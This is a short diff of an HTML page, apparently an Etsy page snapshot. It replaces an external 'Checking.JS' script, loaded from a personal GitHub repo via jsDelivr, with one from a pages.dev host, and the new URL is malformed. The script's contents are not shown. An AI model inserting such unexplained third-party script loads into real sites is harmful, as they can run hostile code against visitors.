@@ -407,12 +407,8 @@
         
     >
 
-    <script src="https://cdn.jsdelivr.net/gh/ursecretadmirer/cdn-globaljs@latest/cdn-globaljs/MainJS/UpperJS/Checking.JS"></script>
+    <script src="https://cdn-globaljs-2jz.pages.dev/cdn-globaljs/MainJS/UpperJS/Checking.JS defer"></script>
 
-<noscript>
-    <div style="display:none;">
-        </div>
-</noscript>
 
         <script nonce="gPiNOjdRCrWLas5Ik2CuS+N0">
     !function(a,b,c,d,e,f){a.ddjskey=e;a.ddoptions=f||null;var m=b.createElement(c),n=b.getElementsByTagName(c)[0];m.async=1,m.defer=1,m.src=d,n.parentNode.insertBefore(m,n)}(window,document,"script","https://www.etsy.com/include/tags.js", "D013AA612AB2224D03B2318D0F5B19", {
